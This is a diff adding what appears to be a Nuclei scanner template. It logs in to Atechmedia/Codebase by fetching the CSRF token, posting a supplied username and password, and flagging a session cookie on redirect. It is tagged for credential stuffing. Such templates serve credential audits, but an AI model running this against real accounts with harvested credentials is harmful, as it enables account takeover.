@@ -1,0 +1,55 @@
+id: atechmedia-codebase-login-check
+
+info:
+  name: Atechmedia/Codebase Login Check
+  author: parthmalhotra,pdresearch
+  severity: critical
+  description: Checks for a valid Atechmedia/Codebase account.
+  reference:
+    - https://owasp.org/www-community/attacks/Credential_stuffing
+  metadata:
+    max-request: 2
+  tags: cloud,creds-stuffing,login-check,atechmedia,codebase
+
+self-contained: true
+
+http:
+  - raw:
+      - |
+        GET https://identity.atechmedia.com/login HTTP/1.1
+        Host: identity.atechmedia.com
+        Referer: https://identity.atechmedia.com/login
+      - |
+        POST https://identity.atechmedia.com/login HTTP/1.1
+        Host: identity.atechmedia.com
+        Origin: https://identity.atechmedia.com
+        Content-Type: application/x-www-form-urlencoded
+        Referer: https://identity.atechmedia.com/login
+
+        utf8=%E2%9C%93&authenticity_token={{url_encode(authenticity_token)}}&username={{username}}&password={{password}}&commit=Login
+
+    extractors:
+      - type: xpath
+        name: authenticity_token
+        part: body
+        attribute: value
+        internal: true
+        xpath:
+          - /html/body/div/div[2]/div/form/input[2]
+
+      - type: dsl
+        dsl:
+          - username
+          - password
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - 'Set-Cookie: user_session'
+
+      - type: status
+        status:
+          - 302
+# digest: 4b0a00483046022100b6260850c8884a11dfab10badc50eca9b785dc2db129f54b76e9605d49a30ebd0221009c6a4578217807fba1884a34be4e6e00b9d627a71fb62fd024876cee11219fe7:922c64590222798bb761d5b6d8e72950
